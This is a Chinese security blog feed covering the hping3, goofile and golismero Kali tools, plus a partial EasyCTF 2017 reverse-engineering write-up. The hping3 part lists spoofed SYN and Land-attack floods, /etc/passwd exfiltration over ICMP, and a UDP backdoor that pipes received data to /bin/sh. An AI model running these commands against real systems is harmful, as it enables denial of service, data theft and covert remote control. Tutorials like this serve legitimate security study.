远程操作系统指纹</div><div class="line">- 远程正常运行时间猜测</div><div class="line">- TCP/IP协议栈审计</div><div class="line">- hping也可以用于学习TCP/IP的学生</div></pre></td></tr></table></figure><p></p><!--more--><p>工具来源：<a href="http://www.hping.org/" target="_blank" rel="external">http://www.hping.org/</a><br><a href="http://www.hping.org/" target="_blank" rel="external">hping3主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/hping3.git;a=summary" target="_blank" rel="external">Kali hping3仓库</a></p><ul><li>作者：Salvatore Sanfilippo</li><li>证书：GPLv2</li></ul><h2 id="0x01-hping3功能"><a href="#0x01-hping3功能" class="headerlink" title="0x01 hping3功能"></a>0x01 hping3功能</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">root@kali:~# hping3 -h</div><div class="line">用法: hping3 主机 [options]</div><div class="line">  -h  --help      显示帮助</div><div class="line">  -v  --version   显示版本</div><div class="line">  -c  --count     数据包计数</div><div class="line">  -i  --interval  等待 (uX即X微秒, 例如： -i u1000)</div><div class="line">      --fast      等同 -i u10000 (每秒10个包)</div><div class="line">      --faster    等同 -i u1000 (每秒100个包)</div><div class="line">      --flood     尽最快发送数据包，不显示回复。</div><div class="line">  -n  --numeric   数字输出</div><div class="line">  -q  --quiet     静默模式</div><div class="line">  -I  --interface 接口名 (默认路由接口)</div><div class="line">  -V  --verbose   详细模式</div><div class="line">  -D  --debug     调试信息</div><div class="line">  -z  --bind      绑定ctrl+z到ttl(默认为目的端口)</div><div class="line">  -Z  --unbind    取消绑定ctrl+z键</div><div class="line">      --beep      对于接收到的每个匹配数据包蜂鸣声提示</div><div class="line">模式</div><div class="line">  默认模式     TCP</div><div class="line">  -0  --rawip      原始IP模式</div><div class="line">  -1  --icmp       ICMP模式</div><div class="line">  -2  --udp        UDP模式</div><div class="line">  -8  --scan       SCAN模式</div><div class="line">                   例子: hping --scan 1-30,70-90 -S www.target.host</div><div class="line">  -9  --listen     listen模式</div><div class="line">IP</div><div class="line">  -a  --spoof      伪造源地址</div><div class="line">  --rand-dest      随机目的地址模式。详细使用man命令</div><div class="line">  --rand-source    随机来源地址模式。详细使用man命令</div><div class="line">  -t  --ttl        ttl (默认64)</div><div class="line">  -N  --id         id (默认随机)</div><div class="line">  -W  --winid      使用win* id字节顺序</div><div class="line">  -r  --rel        相对id字段(估计主机流量)</div><div class="line">  -f  --frag       拆分数据包更多的frag</div><div class="line">  -x  --morefrag   设置更多的分段标志</div><div class="line">  -y  --dontfrag   设置不分段标志</div><div class="line">  -g  --fragoff    设置分段偏移</div><div class="line">  -m  --mtu        设置虚拟最大传输单元</div><div class="line">  -o  --tos        服务类型（默认为0x00），尝试--tos帮助</div><div class="line">  -G  --rroute     包含RECORD_ROUTE选项并显示路由缓冲区</div><div class="line">  --lsrr           松散源路由并记录路由</div><div class="line">  --ssrr           严格源路由并记录路由</div><div class="line">  -H  --ipproto    设置IP协议字段，仅在RAW IP模式下使用</div><div class="line">ICMP</div><div class="line">  -C  --icmptype   icmp类型(默认echo请求)</div><div class="line">  -K  --icmpcode   icmp代号(默认0)</div><div class="line">      --force-icmp 发送所有icmp类型(默认仅发送支持的类型)</div><div class="line">      --icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)</div><div class="line">      --icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)</div><div class="line">      --icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)</div><div class="line">      --icmp-help  显示其他icmp选项帮助</div><div class="line">UDP/TCP</div><div class="line">  -s  --baseport   基源端口(默认随机)</div><div class="line">  -p  --destport   [+][+]&lt;port&gt; 目的端口(默认0) ctrl+z inc/dec</div><div class="line">  -k  --keep       保持源端口</div><div class="line">  -w  --win        windows发送字节(默认64)</div><div class="line">  -O  --tcpoff     设置伪造tcp数据偏移量(取代tcp地址长度除4)</div><div class="line">  -Q  --seqnum     仅显示tcp序列号</div><div class="line">  -b  --badcksum   (尝试)发送具有错误IP校验和数据包                    </div><div class="line">                   许多系统将修复发送数据包的IP校验和                    </div><div class="line">                   所以你会得到错误UDP/TCP校验和。</div><div class="line">  -M  --setseq     设置TCP序列号</div><div class="line">  -L  --setack     设置TCP确认</div><div class="line">  -F  --fin        设置FIN标志</div><div class="line">  -S  --syn        设置SYN标志</div><div class="line">  -R  --rst        设置RST标志</div><div class="line">  -P  --push       设置PUSH标志</div><div class="line">  -A  --ack        设置ACK标志</div><div class="line">  -U  --urg        设置URG标志</div><div class="line">  -X  --xmas       设置X未使用的标志(0x40)</div><div class="line">  -Y  --ymas       设置Y未使用的标志(0x80)</div><div class="line">  --tcpexitcode    使用last tcp-&gt; th_flags作为退出码</div><div class="line">  --tcp-mss        启用具有给定值的TCP MSS选项</div><div class="line">  --tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptime</div><div class="line">通用</div><div class="line">  -d  --data       数据大小(默认0)</div><div class="line">  -E  --file       文件数据</div><div class="line">  -e  --sign       添加“签名”</div><div class="line">  -j  --dump       转储为十六进制数据包</div><div class="line">  -J  --print      转储为可打印字符</div><div class="line">  -B  --safe       启用“安全”协议</div><div class="line">  -u  --end        告诉你什么时候--file达到EOF并防止倒回</div><div class="line">  -T  --traceroute traceroute模式(等同使用 --bind 且--ttl 1)</div><div class="line">  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出</div><div class="line">  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳</div><div class="line">  --tr-no-rtt      不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）</div><div class="line">  --apd-send       发送APD描述数据包(参见docs / APD.txt)</div></pre></td></tr></table></figure><h2 id="0x02-hping3用法示例"><a href="#0x02-hping3用法示例" class="headerlink" title="0x02 hping3用法示例"></a>0x02 hping3用法示例</h2><p>对于目标（www.example.com），使用跟踪路由模式（-traceroute），在ICMP模式（-1）中详细显示verbose（-V）：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# hping3 --traceroute -V -1 www.example.com</div><div class="line">using eth0, addr: 192.168.1.15, MTU: 1500</div><div class="line">HPING www.example.com (eth0 93.184.216.119): icmp mode set, 28 headers + 0 data bytes</div><div class="line">hop=1 TTL 0 during transit from ip=192.168.1.1 name=UNKNOWN</div><div class="line">hop=1 hoprtt=0.3 ms</div><div class="line">hop=2 TTL 0 during transit from ip=192.168.0.1 name=UNKNOWN</div><div class="line">hop=2 hoprtt=3.3 ms</div></pre></td></tr></table></figure><p></p><h2 id="0x03-hping3典型功能"><a href="#0x03-hping3典型功能" class="headerlink" title="0x03 hping3典型功能"></a>0x03 hping3典型功能</h2><p><strong>防火墙测试</strong><br>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank" rel="external">http://0daysecurity.com/articles/hping3_examples.html</a><br>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。<br>例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><pre><code>hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 
</code></pre><p>端口扫描<br>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。<br>以下示例可用于探测目标机的80端口是否开放：</p><pre><code>hping3 -I eth0 -S 192.168.10.1 -p 80 
</code></pre><p>其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。<br>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，<br>所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。<br>当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p><p><strong>Idle扫描</strong><br>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，<br>目前Idle扫描在Nmap中也有实现。 该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），<br>攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），<br>此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，<br>获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><p><strong>拒绝服务攻击</strong></p><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><pre><code>hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000 
</code></pre><p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p><p><strong>文件传输</strong><br>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。<br>实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。<br>在接收端开启服务：</p><pre><code>hping3 192.168.1.159--listen signature --safe --icmp 
</code></pre><p>监听ICMP包中的签名，根据签名解析出文件内容。<br>在发送端使用签名打包的ICMP包发送文件：</p><pre><code>hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd 
</code></pre><p>将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><p><strong>木马功能</strong><br>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。<br>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。<br>在木马启动端：</p><pre><code>hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh 
</code></pre><p>在远程控制端：</p><pre><code>echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd 
</code></pre><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。<br>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> recon </tag>
            
            <tag> spoofing </tag>
            
            <tag> hping3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之goofile]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bgoofile/</url>
      <content type="html"><![CDATA[<h2 id="0x00-goofile介绍"><a href="#0x00-goofile介绍" class="headerlink" title="0x00 goofile介绍"></a>0x00 goofile介绍</h2><p>视频介绍：<a href="https://asciinema.org/a/31264" target="_blank" rel="external">https://asciinema.org/a/31264</a><br>使用此工具可以在给定的域中搜索特定的文件类型。</p><a id="more"></a><p><a href="http://code.google.com/p/goofile/" target="_blank" rel="external">goofile主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/goofile.git;a=summary" target="_blank" rel="external">Kali goofile仓库</a></p><ul><li>作者：Thomas Richards</li><li>证书：MIT</li></ul><h2 id="0x01-goofile功能"><a href="#0x01-goofile功能" class="headerlink" title="0x01 goofile功能"></a>0x01 goofile功能</h2><p>golismero - Web应用程序映射器<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">root@kali:~# goofile</div><div class="line"></div><div class="line">-------------------------------------</div><div class="line">|Goofile v1.5                       |</div><div class="line">|Coded by Thomas (G13) Richards     |</div><div class="line">|www.g13net.com                     |</div><div class="line">|code.google.com/p/goofile          |</div><div class="line">-------------------------------------</div><div class="line"></div><div class="line"></div><div class="line">Goofile 1.5</div><div class="line"></div><div class="line">用法: goofile [选项]</div><div class="line"></div><div class="line">       -d: 指定域名</div><div class="line"></div><div class="line">       -f: 指定文件类型 (扩展名如：pdf)</div><div class="line"></div><div class="line">示例:./goofile.py -d test.com -f txt</div></pre></td></tr></table></figure><p></p><h2 id="0x02-goofile用法示例"><a href="#0x02-goofile用法示例" class="headerlink" title="0x02 goofile用法示例"></a>0x02 goofile用法示例</h2><p>搜索域名(-d kali.org)中的PDF文件(-f pdf):<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">root@kali:~# goofile -d kali.org -f pdf</div><div class="line"></div><div class="line">-------------------------------------</div><div class="line">|Goofile v1.5                       |</div><div class="line">|Coded by Thomas (G13) Richards     |</div><div class="line">|www.g13net.com                     |</div><div class="line">|code.google.com/p/goofile          |</div><div class="line">-------------------------------------</div><div class="line"></div><div class="line"></div><div class="line">Searching in kali.org for pdf</div><div class="line">========================================</div><div class="line"></div><div class="line">Files found:</div><div class="line">====================</div><div class="line"></div><div class="line">docs.kali.org/pdf/kali-book-fr.pdf</div><div class="line">docs.kali.org/pdf/kali-book-es.pdf</div><div class="line">docs.kali.org/pdf/kali-book-id.pdf</div><div class="line">docs.kali.org/pdf/kali-book-de.pdf</div><div class="line">docs.kali.org/pdf/kali-book-it.pdf</div><div class="line">docs.kali.org/pdf/kali-book-ar.pdf</div><div class="line">docs.kali.org/pdf/kali-book-ja.pdf</div><div class="line">docs.kali.org/pdf/kali-book-nl.pdf</div><div class="line">docs.kali.org/pdf/kali-book-ru.pdf</div><div class="line">docs.kali.org/pdf/kali-book-en.pdf</div><div class="line">docs.kali.org/pdf/kali-book-pt-br.pdf</div><div class="line">docs.kali.org/pdf/kali-book-zh-hans.pdf</div><div class="line">docs.kali.org/pdf/kali-book-sw.pdf</div><div class="line">docs.kali.org/pdf/articles/kali-linux-live-usb-install-en.pdf</div><div class="line">====================</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> goofile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之golismero]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bgolismero/</url>
      <content type="html"><![CDATA[<h2 id="0x00-golismero介绍"><a href="#0x00-golismero介绍" class="headerlink" title="0x00 golismero介绍"></a>0x00 golismero介绍</h2><p>GoLismero是安全性测试的开源框架。它是目前面向网络的安全性，但它可以很容易地扩展到其他类型的扫描。</p><a id="more"></a><p>该框架的最有趣的特点是：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">- 真正的跨平台独立性，经过Windows，Linux，* BSD和OS X平台测试。</div><div class="line">- 没有平台本地库依赖，纯Python编写的框架。</div><div class="line">- 与使用Python和其他脚本语言编写的其他框架相比，性能较好。</div><div class="line">- 简单易用。</div><div class="line">- 插件开发非常简单。</div><div class="line">- 该框架还收集并统一了众所周知的工具的结果：sqlmap，xsser，openvas，dnsrecon，theharvester</div><div class="line">- 标准集成：CWE，CVE和OWASP。</div><div class="line">- 专为集群部署而设计（尚不可用）。</div></pre></td></tr></table></figure><p></p><p>工具来源：<a href="https://github.com/golismero/golismero" target="_blank" rel="external">https://github.com/golismero/golismero</a></p><p><a href="https://github.com/golismero/golismero" target="_blank" rel="external">golismero主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/golismero.git;a=summary" target="_blank" rel="external">Kali golismero仓库</a></p><ul><li>作者：Daniel Garcia</li><li>证书：GPLv2</li></ul><h2 id="0x01-golismero功能"><a href="#0x01-golismero功能" class="headerlink" title="0x01 golismero功能"></a>0x01 golismero功能</h2><p>golismero - Web应用程序映射器<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">root@kali:~# golismero -h</div><div class="line"></div><div class="line">/----------------------------------------------\</div><div class="line">| GoLismero 2.0.0b3 - The Web Knife            |</div><div class="line">| Contact: golismero.project&lt;@&gt;gmail.com       |</div><div class="line">|                                              |</div><div class="line">| Daniel Garcia Garcia a.k.a cr0hn (@ggdaniel) |</div><div class="line">| Mario Vilas (@Mario_Vilas)                   |</div><div class="line">\----------------------------------------------/</div><div class="line"></div><div class="line">用法: golismero.py 命令 [目标...] [--选项]</div><div class="line"></div><div class="line">  SCAN:</div><div class="line">    扫描给定的目标漏洞，可选导入来自其他工具的结果并撰写报告。 </div><div class="line">    后面的参数可以是域名，IP地址或网页。</div><div class="line"></div><div class="line">  PROFILES:</div><div class="line">    显示可用的配置文件列表，此命令不带参数。</div><div class="line"></div><div class="line">  PLUGINS:</div><div class="line">    显示可用的插件列表，此命令不带参数。</div><div class="line"></div><div class="line">  INFO:</div><div class="line">    显示给定插件的详细信息，后面的参数是插件ID。</div><div class="line">    你可以使用glob风格的通配符。</div><div class="line"></div><div class="line">  REPORT:</div><div class="line">    从较早的扫描中生成报告。</div><div class="line">    此命令不带参数，使用-o参数指定输出文件。</div><div class="line"></div><div class="line">  IMPORT:</div><div class="line">    从其他工具导入结果，并可选择生成报告，但不要扫描目标。</div><div class="line">    此命令不带参数,使用-i参数指定输入文件。</div><div class="line"></div><div class="line">  DUMP:</div><div class="line">    从早期扫描中转储为SQL格式数据库。</div><div class="line">    此命令不带参数，使用-o参数指定输出文件。</div><div class="line"></div><div class="line">  UPDATE:</div><div class="line">    将GoLismero更新到最新版本，需要安装Git且添加PATH变量环境。</div><div class="line">    此命令不带参数。</div><div class="line"></div><div class="line">示例:</div><div class="line"></div><div class="line">  扫描网站并在屏幕上显示结果：</div><div class="line">    golismero.py scan http://www.example.com</div><div class="line"></div><div class="line">  导入Nmap结果，扫描发现的所有主机并写入HTML报告： </div><div class="line">    golismero.py scan -i nmap_output.xml -o report.html</div><div class="line"></div><div class="line">  导入OpenVAS结果并在屏幕上显示，但不要扫描任何内容： </div><div class="line">    golismero.py import -i openvas_output.xml</div><div class="line"></div><div class="line">  显示所有可用配置文件列表：</div><div class="line">    golismero.py profiles</div><div class="line"></div><div class="line">  显示所有可用插件列表：</div><div class="line">    golismero.py plugins</div><div class="line"></div><div class="line">  显示所有有关蛮力插件信息：</div><div class="line">    golismero.py info brute_*</div><div class="line"></div><div class="line">  转储上一次扫描的数据库：</div><div class="line">    golismero.py dump -db example.db -o dump.sql</div></pre></td></tr></table></figure><p></p><h2 id="0x02-golismero用法示例"><a href="#0x02-golismero用法示例" class="headerlink" title="0x02 golismero用法示例"></a>0x02 golismero用法示例</h2><p>对输入文件（-i /root/port80.xml）中的目标运行漏洞扫描（扫描），将输出保存到文件（-o sub1-port80.html）：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# golismero scan -i /root/port80.xml -o sub1-port80.html</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> golismero </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EasyCTF 2017 Reverse Pwn Write Up]]></title>
      <url>/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/</url>
      <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x06-Reverse-Engineering"><a href="#0x06-Reverse-Engineering" class="headerlink" title="0x06 Reverse Engineering"></a>0x06 Reverse Engineering</h1><h2 id="Hexable"><a href="#Hexable" class="headerlink" title="Hexable"></a>Hexable</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I tried to hide a flag sneakily, can you find it? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable" target="_blank" rel="external">Download</a></p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/EYMzgNU.png" alt=""></p><h2 id="Phunky-Python-I"><a href="#Phunky-Python-I" class="headerlink" title="Phunky Python I"></a>Phunky Python I</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled <code>phunky</code>.</p><p>We’ve determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of <code>x</code> such that the program prints out <code>easyctf</code> (make sure it’s lowercase!).</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/phunkypython1" target="_blank" rel="external">phunky1.py</a></p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x = <span class="number">9758391023608105872L</span> - <span class="number">102</span></div><div class="line">digs = [<span class="number">9758391023608105871L</span>, <span class="number">9758391023608105867L</span>, <span class="number">9758391023608105885L</span>, <span class="number">9758391023608105891L</span>, <span class="number">9758391023608105869L</span>, <span class="number">9758391023608105886L</span>, <span class="number">9758391023608105872L</span>]</div><div class="line">out = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> reversed(digs):</div><div class="line">   	out = chr(letter - x) + out</div><div class="line"><span class="keyword">print</span> out + <span class="string">'&#123;'</span> + str(x) + <span class="string">'&#125;'</span></div></pre></td></tr></table></figure><p>flag：<code>easyctf{9758391023608105770}</code></p><h2 id="Useless-Python"><a href="#Useless-Python" class="headerlink" title="Useless Python"></a>Useless Python</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>Boredom took over, so I wrote this python file! I didn’t want anyone to see it though because it doesn’t actually run, so I used the coolest base-16 encoding to keep it secret. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/useless-python/useless.py" target="_blank" rel="external">python</a></p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">s=open(<span class="string">'useless.py'</span>).read()</div><div class="line">s=s.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> <span class="string">'exec('</span> <span class="keyword">in</span> s:</div><div class="line">        s = eval(s[<span class="number">5</span>:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><hr><pre><code>flag = &apos;easyctf{python_3x3c_exec_3xec_ex3c}&apos;
priint flag
</code></pre><h2 id="Phunky-Python-II"><a href="#Phunky-Python-II" class="headerlink" title="Phunky Python II"></a>Phunky Python II</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>We stumbled across another phunky Python file. Can you find the redacted value of jkx that makes this program print <code>True</code>?</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>题目：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> operator</div><div class="line">jkx = <span class="number">0</span> <span class="comment"># REDACTED</span></div><div class="line">pork = ((<span class="number">12</span>*jkx+<span class="number">44</span>)/<span class="number">4</span>)-(<span class="number">1234</span>/<span class="number">617</span>)*jkx-sum([<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>])</div><div class="line">jkx *= pork</div><div class="line">pp = filter(<span class="keyword">lambda</span> g: <span class="keyword">not</span> any(g % u == <span class="number">0</span> <span class="keyword">for</span> u <span class="keyword">in</span> range(<span class="number">2</span>, g)), range(<span class="number">2</span>, <span class="number">10000</span>))</div><div class="line">b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str(jkx)))))</div><div class="line"><span class="keyword">print</span> b == <span class="number">6548044661510965675361835669609097497614277988316628335954865908614987464656662774230164176397886049495203497380194320473112237121935351588106637391652296924206523967496334906449626062538176842451446687574581963609515235677360001918335627990557065870263618484501558703622228018822062325974112864876000000</span></div></pre></td></tr></table></figure><p></p><p>第3行简化一下：</p><pre><code>pork = ((12*jkx+44)/4)-(1234/617)*jkx-sum([1, 4, 7])
pork = (3*jkx+11)-(1234/617)*jkx-12
pork = 3*jkx+11-2*jkx-12
pork = jkx - 1
</code></pre><p>结合第四行再次简化：</p><pre><code>jkx = jkx*(jkx-1)
</code></pre><p>第五行：<code>pp = filter(lambda g: not any(g % u == 0 for u in range(2, g)), range(2, 10000))</code>是生成小于10000的所有质数列表（这语法骚得不行Orz）</p><p><img src="http://i.imgur.com/Lynz2lq.png" alt=""></p><p>第六行：<code>b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) for i in range(len(str(jkx)))))</code></p><p>即：</p><pre><code>b = 1
for i in range(len(str(jkx))):
